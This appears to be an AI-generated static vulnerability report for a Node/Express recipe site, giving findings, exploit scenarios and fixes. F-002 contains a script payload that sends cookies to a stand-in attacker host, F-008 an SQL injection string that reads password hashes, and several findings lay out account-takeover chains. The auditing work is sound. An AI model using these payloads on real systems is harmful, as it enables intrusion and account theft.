# Vulnerability findings — EatHub

**Target:** `/Users/smacica/Documents/program/claude_scan/Auth_Recepie_Website`
**Scanned:** 2026-08-15T07:59:02Z
**Method:** static review only — no code was built, run, or probed.
**Scope:** 16 source files (tests excluded), scoped by `THREAT_MODEL.md` sections 3 and 4, with the Express/Node category list from `.claude/scan-extras-express.txt` appended to the brief.

13 findings: 4 HIGH, 5 MEDIUM, 4 LOW. 4 findings scored below 0.4 confidence.
Sorted by confidence descending — the top of this file is the highest-signal material.

| id | severity | conf | category | file:line | title |
|---|---|---|---|---|---|
| F-001 | HIGH | 0.9 | auth-bypass | db.js:553 | Google sign-in links to a pre-registered local account and marks it verified |
| F-002 | HIGH | 0.85 | xss | file_uploud.js:10 | Upload extension comes from the client, file served from the app origin |
| F-003 | HIGH | 0.7 | hardcoded-secret | session_config.js:22 | Session secret falls back to a hardcoded literal |
| F-004 | MEDIUM | 0.65 | csrf | google_strategy.js:13 | OAuth flow omits `state`, allowing login CSRF |
| F-005 | HIGH | 0.6 | host-header-injection | routes/user.js:19 | Verification links built from the `Host` header |
| F-006 | MEDIUM | 0.6 | cors-misconfiguration | index.js:43 | CORS reflects any Origin with credentials enabled |
| F-007 | MEDIUM | 0.5 | sensitive-data-exposure | mailer.js:39 | Verification links printed to stdout when SMTP is unset |
| F-008 | MEDIUM | 0.4 | sql-injection | db.js:593 | Query helpers interpolate table, column and LIMIT into SQL |
| F-009 | LOW | 0.4 | insecure-randomness | routes/recipe.js:37 | Recipe ids truncate a UUID to 32 bits and name the photo file |
| F-010 | MEDIUM | 0.35 | open-redirect | routes/user.js:14 | `safeNext` accepts backslash paths browsers treat as protocol-relative |
| F-011 | LOW | 0.35 | improper-input-validation | routes/recipe.js:266 | Vote endpoint forwards an unparsed path parameter |
| F-012 | LOW | 0.3 | logic-error | db.js:646 | `dbDel`'s two-column branch runs a SELECT as the delete |
| F-013 | LOW | 0.3 | redos | routes/user.js:23 | Email regex runs against an unbounded request string |

---

### F-001 — Google sign-in links to a pre-registered local account and marks it verified

**HIGH** · confidence 0.9 · `auth-bypass` · `db.js:553`

`dbFindOrCreateGoogleUser` falls back from `google_id` to an email match (`db.js:548-559`). When a local account already exists with that address it links `google_id` onto it and unconditionally sets `email_verified = 1` (`db.js:553-554`), with no check that the local account's address was ever confirmed. Signup does not require confirmation before the row is created: `routes/user.js:44` writes the user with `email_verified = 0` and any attacker-chosen bcrypt password. `local_strategy.js:30` is the only gate on that password, and it tests exactly the flag that the Google link just flipped. The Google profile's own `emails[0].verified` field is never consulted (`google_strategy.js:25`).

**Exploit scenario.** Attacker POSTs `/api/signup` with `victim@example.com` and a password they choose. The row is created unverified; the confirmation mail goes to the victim, who ignores it. Later the victim signs in with Google for the first time. `dbFindOrCreateGoogleUser` matches their address, links it, and sets `email_verified = 1`. The attacker now POSTs `/api/login` with `victim@example.com` and their own password and is signed in as the victim, with the victim seeing nothing unusual.

**Fix.** Do not treat an email match as proof of ownership. Either refuse to link and force the user through the existing local login, or require the local account to already be `email_verified` before linking. Never promote `email_verified` as a side effect of linking, and check `profile.emails[0].verified` on the Google side before trusting the address at all.

*Confidence:* re-read both files; the flow is exactly as described and every step is unconditional. Only uncertainty is whether the owner considers linking-by-email intended, which does not change the takeover.

---

### F-002 — Upload extension comes from the client, file served from the app origin

**HIGH** · confidence 0.85 · `xss` · `file_uploud.js:10`

multer's `filename` callback appends `path.extname(file.originalname)` to the server-generated recipe id (`file_uploud.js:10`), so the attacker chooses the stored file's extension. The only content gate is `fileFilter` testing `file.mimetype.startsWith('image/')` (`file_uploud.js:18`), and that mimetype is the `Content-Type` the client wrote into the multipart part — it is not derived from the bytes. The stored file is then served by `GET /data/recipes_pics/:filename` through `res.sendFile` (`routes/recipe.js:281`), which sets `Content-Type` from the file extension. `path.basename()` there prevents traversal but does nothing about the extension. No security response headers are set anywhere in `index.js`, so there is no CSP or `X-Content-Type-Options` to fall back on.

**Exploit scenario.** An authenticated user POSTs `/api/recipes` with a multipart part named `image`, filename `payload.html`, `Content-Type: image/png`, and a body containing `<script>fetch('https://attacker.tld/'+document.cookie)</script>` or a same-origin request that deletes the victim's recipes. The file is accepted and stored as `<recipeId>.html`. The attacker sends any logged-in user to `/data/recipes_pics/<recipeId>.html`; Express serves it as `text/html` and the script executes on the application's own origin with the victim's session attached. An `.svg` payload achieves the same thing.

**Fix.** Derive the extension server-side from sniffed content (e.g. a magic-byte check) against an allowlist of png/jpeg/webp, and reject anything else; never use `path.extname(originalname)`. Serve uploads with `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment`, ideally from a separate origin, and add helmet with a strict CSP.

*Confidence:* both halves verified in source. `res.sendFile` setting Content-Type from the extension is standard Express behaviour; the mimetype filter is client-controlled by definition.

---

### F-003 — Session signing secret silently falls back to a hardcoded literal

**HIGH** · confidence 0.7 · `hardcoded-secret` · `session_config.js:22`

`sessionConf.secret` is `process.env.SESSION_SECRET || "dev-only-secret"` (`session_config.js:22`). A missing `SESSION_SECRET` produces a `logger.warn` at boot (`session_config.js:12`) and the application then starts and serves traffic normally with a secret that is published in this repository. The value is the HMAC key express-session uses to sign `connect.sid`, so knowing it is enough to mint a cookie the server accepts. Nothing downstream re-checks authenticity: `passport.deserializeUser` (`index.js:29`) simply loads whichever `user_id` the session names.

**Exploit scenario.** The app is deployed with the environment variable unset or misspelled — the only signal is one warn line in the boot log, and the site works. An attacker who has seen this source (it is a GitHub repository) signs a `connect.sid` value with `dev-only-secret` for a session id they control, POSTs once to create the matching session row, then forges a session naming any `user_id` and is authenticated as that user. No password, no token, no interaction with the victim.

**Fix.** Fail closed: throw at startup when `SESSION_SECRET` is absent, rather than warning. Apply the same rule to `GOOGLE_CLIENT_ID`/`SECRET`, which currently fall back to `'missing-client-id'` (`google_strategy.js:15-16`).

*Confidence:* code confirmed. Rated 0.7 rather than higher because exploitation requires the operator to actually deploy without the variable — but the failure is silent, which is exactly why this pattern is reportable.

---

### F-004 — OAuth flow omits `state`, allowing login CSRF

**MEDIUM** · confidence 0.65 · `csrf` · `google_strategy.js:13`

The `GoogleStrategy` is constructed with `clientID`, `clientSecret`, `callbackURL` and `scope` only (`google_strategy.js:13-19`), and `routes/user.js:138` calls `passport.authenticate('google', { scope: [...] })` without `state`. passport-google-oauth20 supports `state: true`, which binds the authorization request to the user's session and rejects a callback that does not carry the matching value. Without it, `/auth/google/callback` (`routes/user.js:145`) accepts any well-formed code presented by any browser and logs that browser in as whoever the code belongs to.

**Exploit scenario.** The attacker begins a Google sign-in for their own account, captures the redirect to `/auth/google/callback?code=...` without following it, and embeds that URL as an image or link on a page the victim visits. The victim's browser completes the callback and is silently signed into the attacker's account. Recipes the victim then creates, and any AI generations they spend, land in the attacker's account; if the victim later attaches anything personal to the profile, the attacker reads it by logging in normally.

**Fix.** Pass `state: true` in the strategy options (the session is already available, which is what `state` requires) and verify that failures redirect rather than 500.

*Confidence:* absence of `state` confirmed in both the strategy config and the authenticate call. Impact is the standard login-CSRF outcome, which is real but bounded on a recipe site.

---

### F-005 — Verification links built from the `Host` header

**HIGH** · confidence 0.6 · `host-header-injection` · `routes/user.js:19`

`baseUrl(req)` returns ``process.env.PUBLIC_URL || `${req.protocol}://${req.get('host')}` `` (`routes/user.js:18-20`). It is passed to `issueVerificationEmail` at `routes/user.js:53` (signup) and `routes/user.js:123` (resend), where `local_strategy.js:46` concatenates it into `` `${baseUrl}/verify-email?token=${token}` `` and mails the result. When `PUBLIC_URL` is empty — which `.env.example:18` presents as an acceptable default — the host portion of that link is whatever `Host` header the requesting client sent. The token itself is strong (32 random bytes, `local_strategy.js:44`), but the link that carries it points wherever the attacker chose.

**Exploit scenario.** The attacker POSTs `/api/resend-verification` with body `{"email":"victim@example.com"}` and header `Host: attacker.tld`. The victim, who has a pending unverified account, receives a genuine-looking EatHub mail whose button points at `https://attacker.tld/verify-email?token=<victim token>`. Clicking it hands the token to the attacker's server, which replays it against the real site. Chained with **F-001** — where the attacker created that pending account with a password of their choosing — this completes an account takeover without the victim ever noticing.

**Fix.** Require `PUBLIC_URL` at startup and build every external link from it; never read `req.get('host')` for anything that leaves the process. If a header-derived host is unavoidable, validate it against an allowlist of expected hostnames.

*Confidence:* data flow confirmed end to end. Held at 0.6 because a fronting proxy that rewrites or validates `Host` would block it, and the production deployment is not yet configured.

---

### F-006 — CORS reflects any Origin with credentials enabled

**MEDIUM** · confidence 0.6 · `cors-misconfiguration` · `index.js:43`

`app.use(cors({ origin: clientUrl || true, credentials: true }))` at `index.js:43`, with the same options on a wildcard OPTIONS handler at `index.js:44`. `clientUrl` is `process.env.CLIENT_URL` (`index.js:22`), which `README.md:217` instructs operators to leave empty in production. `origin: true` makes the cors package echo the requesting Origin into `Access-Control-Allow-Origin`, and `credentials: true` adds `Access-Control-Allow-Credentials: true` — the combination the specification forbids with a wildcard, reached here by reflection instead. Every authenticated endpoint (`/api/profile`, `/api/recipes/mine`, `/api/ai/quota`) is then readable cross-origin by any site, subject only to whether the browser attaches the cookie.

**Exploit scenario.** A victim with a live session visits `attacker.tld`, which issues `fetch('https://eathub.example.com/api/profile', {credentials:'include'})`. The response carries `Access-Control-Allow-Origin: https://attacker.tld` and `Allow-Credentials: true`, so the attacker's script reads the victim's email address and profile. Today the `sameSite: 'lax'` cookie (`session_config.js:26`) keeps the browser from attaching the session on that cross-site fetch, so the request comes back unauthenticated — the misconfiguration is one cookie-attribute change, one subdomain compromise, or one non-conforming client away from being live.

**Fix.** Replace `origin: clientUrl || true` with an explicit allowlist and reject everything else. Never let the fallback be reflection; if `CLIENT_URL` is empty because the SPA is same-origin, CORS can be disabled entirely rather than opened to all.

*Confidence:* configuration confirmed; SameSite=Lax genuinely blunts it today, which is why this is MEDIUM and 0.6 rather than HIGH.

---

### F-007 — Verification links printed to stdout when SMTP is unset

**MEDIUM** · confidence 0.5 · `sensitive-data-exposure` · `mailer.js:39`

`sendVerificationEmail` falls back to `console.log` of the full verification URL, including the token, when no SMTP transport was built (`mailer.js:36-40`). The transport exists only if `SMTP_HOST`, `SMTP_USER` and `SMTP_PASS` are all set (`mailer.js:5`); otherwise the app warns once at boot (`mailer.js:8`) and keeps running. The comment at `mailer.js:37-38` states the bypass of the logger is deliberate so the line cannot be filtered — which also means it cannot be redacted or level-gated. `request_log.js:24-26` goes to some trouble to strip query strings from logged paths precisely because this token is a live credential; this path writes it out in full.

**Exploit scenario.** The app is deployed with SMTP credentials missing or wrong. Signup still returns 201 and the flow appears to work, but every verification link is written to the container's stdout, which on DigitalOcean App Platform is retained and readable by anyone with dashboard or log-drain access. Someone with read-only access to logs — or an attacker who has obtained a log export — collects tokens and confirms accounts they registered against other people's addresses, which combined with F-001 yields those accounts.

**Fix.** Gate the console fallback on `NODE_ENV !== 'production'`, and fail startup in production when SMTP is required but unconfigured. Log `verification link generated for user <id>` rather than the URL.

*Confidence:* code path confirmed. Rated 0.5 because it requires a production misconfiguration plus log access; the dev-time behaviour is intentional and reasonable.

---

### F-008 — Query helpers interpolate table, column and LIMIT into SQL

**MEDIUM** · confidence 0.4 · `sql-injection` · `db.js:593`

`dbFind` builds `` `SELECT * FROM ${table} WHERE ${column}=?` `` and appends `` ` LIMIT ${limit};` `` (`db.js:593-601`); `dbUpdate` interpolates `table`, `setColumn` and `conditionColumn`, and in the increment branch also splices the column name into the SET expression (`db.js:619-628`); `dbDel` does the same (`db.js:642-647`). Values are bound correctly in all three, so no current call site is injectable — every identifier argument in the tree is a string literal written by the developer. This is a latent sink rather than a live vulnerability: the helpers are exported (`db.js:659`) and shaped to take identifiers as parameters, so the first caller that forwards a request field turns it into injection with no visible change to these functions.

**Exploit scenario.** No current exploit path — reported as a latent sink. The realistic future shape: a search or sort feature is added as `dbFind('recipes', req.query.field, req.query.value)`, and an attacker sends `?field=name FROM recipes UNION SELECT password,1,1,1,1,1,1,1 FROM users--`, reading password hashes out of the users table.

**Fix.** Replace the generic helpers with per-table functions that hard-code their identifiers, or validate table/column against a fixed allowlist before interpolation and bind LIMIT as a parameter.

*Confidence:* the interpolation is real and confirmed at all three functions, but no attacker-controlled identifier reaches them today, so this will likely be triaged as defence-in-depth rather than exploitable.

---

### F-009 — Recipe ids truncate a UUID to 32 bits and name the photo file

**LOW** · confidence 0.4 · `insecure-randomness` · `routes/recipe.js:37`

`generateRecipeId` computes `parseInt(uuid(), 16)` (`routes/recipe.js:37`). `uuid()` returns a hyphenated v4 string, and `parseInt` stops at the first non-hex character, so only the leading 8 hex digits are consumed — the id is 32 bits of entropy, not 128. The same value becomes the recipe primary key (`db.js:246`) and the uploaded photo's filename stem (`file_uploud.js:10`). A collision therefore fails the INSERT on the primary key (`db.js:29`) after multer has already written the photo to disk, and the new file overwrites the existing recipe's image when the extensions match.

**Exploit scenario.** Not directly attacker-steerable — the id is server-generated. The realistic outcome is accidental: at roughly 77k recipes the birthday bound puts collisions near even odds, and each one silently replaces another user's photo while returning a 500 to the uploader. An attacker willing to create many recipes accelerates this but gains no read access.

**Fix.** Use the full uuid string as a TEXT primary key, or an INTEGER PRIMARY KEY AUTOINCREMENT, and name uploaded files with an independent random token rather than the recipe id.

*Confidence:* `parseInt` truncation at the hyphen is certain and the shared filename/PK coupling is confirmed; scored 0.4 because the impact is integrity-only with no attacker control over which recipe collides.

---

### F-010 — `safeNext` accepts backslash paths browsers treat as protocol-relative

**MEDIUM** · confidence 0.35 · `open-redirect` · `routes/user.js:14`

`safeNext` returns the value when it starts with `/` and does not start with `//` (`routes/user.js:14`). It does not reject `/\`, and Chrome, Firefox and Safari normalise a backslash in the authority position to a forward slash, so a `Location` header of `/\attacker.tld` is followed as `//attacker.tld` — an off-site redirect. The value reaches the header via `req.session.returnTo`, set from `req.query.next` at `routes/user.js:137` and used at `routes/user.js:157-160` as `res.redirect(clientUrl + returnTo)`; in production `clientUrl` is empty (`README.md:217`), so the header is exactly the attacker's string. Reported despite the default brief's exclusion because `--extra` explicitly requests open redirect.

**Exploit scenario.** Attacker sends a victim to `https://eathub.example.com/auth/google?next=/\attacker.tld`. The victim completes a genuine Google sign-in on the real site, and the callback redirects their browser to `attacker.tld` — a phishing page that inherits the trust of a link the user watched work. **Caveat:** passport 0.6 regenerates the session inside `req.login` (`passport/lib/sessionmanager.js:28`), which discards `req.session.returnTo` before `routes/user.js:157` reads it, so on the current dependency versions the redirect falls through to `safeNext(undefined) => '/'`. The guard is wrong; a passport upgrade, a `keepSessionInfo` option, or any new caller of `safeNext` makes it exploitable.

**Fix.** Reject any value whose second character is `/` or `\`, or better, resolve the candidate with `new URL(value, 'https://placeholder.invalid')` and require the result's origin to equal the placeholder before using it.

*Confidence:* the bypass in `safeNext` is real, but session regeneration in passport's `logIn` almost certainly neutralizes the only path that reaches it today, so this is a latent guard bug rather than a live redirect.

---

### F-011 — Vote endpoint forwards an unparsed path parameter

**LOW** · confidence 0.35 · `improper-input-validation` · `routes/recipe.js:266`

Every other route parses and validates its id (`routes/recipe.js:87, 196, 209, 239, 307`), but the like handler forwards `req.params.recipe_id` as the raw string to `handlelike` (`routes/recipe.js:266`), which uses it in the likes lookup, INSERT and ranking UPDATE (`db.js:155, 189, 193`). There is no `Number.isNaN` guard and no check that the recipe exists. Values are bound as parameters, so this is not injection; the consequence is that rows can be created against ids matching no recipe, and SQLite type affinity means `'42'` and `42` can behave inconsistently in the likes table.

**Exploit scenario.** An authenticated user POSTs `/api/recipes/999999999/like` with `{"like":1}`. If the foreign key is not enforced on that connection — `PRAGMA foreign_keys` is issued through `db.get` at `db.js:120`, whose result is never checked — a likes row is created for a non-existent recipe and the ranking UPDATE silently affects nothing. The practical effect is junk rows and vote counts that disagree with the likes table, not disclosure or takeover.

**Fix.** Parse and validate `recipe_id` the way the sibling routes do, confirm the recipe exists before recording a vote, and verify that `PRAGMA foreign_keys` actually applied rather than assuming it.

*Confidence:* the missing validation is confirmed by contrast with every neighbouring route, but the impact is data-hygiene rather than a security boundary, so triage may well drop it.

---

### F-012 — `dbDel`'s two-column branch runs a SELECT as the delete

**LOW** · confidence 0.3 · `logic-error` · `db.js:646`

`dbDel` starts with a correct DELETE (`db.js:642`), but when both `column2` and `value2` are supplied it overwrites `delQuerry` with a `SELECT ... LIMIT 1` (`db.js:646-647`) and then passes that string to `db.run` (`db.js:649`). `db.run` executes the SELECT, discards the rows and calls back with no error, so the promise resolves successfully while nothing was deleted. The function is exported (`db.js:659`) but has no callers anywhere in the tree, so there is no live impact — it is a delete that silently does not delete, waiting for a caller.

**Exploit scenario.** No current exploit path. The failure mode it sets up: a future caller uses `dbDel('email_tokens','user_id',id,'token',tok)` to invalidate a verification token, or `dbDel('sessions','sid',sid,'user_id',uid)` to revoke a session. The call resolves cleanly, the code reports success, and the credential remains valid and usable.

**Fix.** Fix the branch to build `` `DELETE FROM ${table} WHERE ${column}=? AND ${column2}=?` ``, or delete the helper outright along with the other unused exports (`addLike`, `dbRecipes`) so nothing can adopt it.

*Confidence:* the bug is unambiguous on re-read, but the function is dead code today, so this is a latent footgun rather than a vulnerability.

---

### F-013 — Email regex runs against an unbounded request string

**LOW** · confidence 0.3 · `redos` · `routes/user.js:23`

`looksLikeEmail` tests `/^[^\s@]+@[^\s@]+\.[^\s@]+$/` (`routes/user.js:23`) against `String(req.body.email || '').trim()` (`routes/user.js:33`), which is length-checked nowhere before the test. The pattern has no nested quantifier, so it is not exponential; backtracking is roughly linear for a single `@` and degrades toward quadratic on inputs containing many `@` separators, since each is retried as the literal. The ceiling is the body-parser limit — 100 kB (`index.js:48`). The same unbounded string then reaches `dbFindByEmail` (`db.js:471`) and bcrypt on the login path.

**Exploit scenario.** An unauthenticated client POSTs `/api/signup` with a 100 kB email field shaped to maximise retries. Each request occupies the single Node event loop for the duration of the match; a handful of concurrent requests degrade responsiveness for everyone. Bounded enough that it is closer to inefficiency than to a reliable outage.

**Fix.** Reject anything over a sane length (RFC 5321 caps addresses at 254 characters) before running the regex, and apply the same cap to username and password fields.

*Confidence:* the missing length cap is real, but the regex is polynomial rather than exponential and the 100 kB ceiling keeps the cost modest — likely triaged as low-value hardening.

---

## Checked and clean

Recorded so triage knows these were looked at, not skipped:

- **No injection sinks.** No `child_process`, `exec`, `eval`, or `new Function` anywhere in the tree; no template engine, so no SSTI surface.
- **No prototype-pollution sink.** No `Object.assign`, `lodash.merge`, or spread of `req.body` into an existing object; request data is only ever read field by field.
- **No mass assignment.** `routes/recipe.js:63-74` and `routes/user.js:44-48` build explicit objects; `dbCreateUser` (`db.js:449-457`) enumerates its columns.
- **No IDOR on delete.** Ownership is checked before the statement in `dbDeleteRecipe` (`db.js:270`) and `dbDeleteComment` (`db.js:375`), the latter correctly allowing the recipe owner as well as the comment author.
- **No path traversal.** `path.basename()` on the photo read path (`routes/recipe.js:281`); the multer destination is a fixed literal (`file_uploud.js:6`).
- **No SSRF.** The only outbound request is to a fixed Gemini endpoint (`gemini.js:7`); no user-supplied URL is fetched.
- **Route-mount ordering is sound.** `isLoggedIn` is applied per route rather than as a global guard, and `/api/recipes/mine` is correctly registered above `/api/recipes/:id` (`routes/recipe.js:297` vs `306`).
- **Error middleware does not leak.** `index.js:68-75` returns a generic message and logs the error server-side; no stack or SQL text reaches the response.
- **Emoji-rule regexes are safe.** All 44 patterns in `shared/ingredients.mjs:9-55` are flat alternations of literals — no nested quantifiers, no ReDoS.

## Excluded by the brief

Real weaknesses that this scan's rules told it not to report, all already tracked in `THREAT_MODEL.md`:

- No rate limiting or lockout on `/api/login`, `/api/signup`, `/api/resend-verification` (threat model T7, T15) — excluded as a rate-limiting gap.
- No length caps on recipe `name`, `info`, `recipe[]` or `ingredients[]` on the manual create path, where the AI path caps everything (`gemini.js:104-110`) — excluded as resource exhaustion (T8).
- Missing security response headers: no helmet, CSP, HSTS, `nosniff` or `frame-ancestors` (T13) — excluded as missing hardening, though it is what makes F-002 fully weaponizable.
- Outdated dependencies: multer 1.4.5-lts.1 (1.x end-of-life), express-sqlite3 0.0.4 (T3) — excluded as outdated third-party versions.
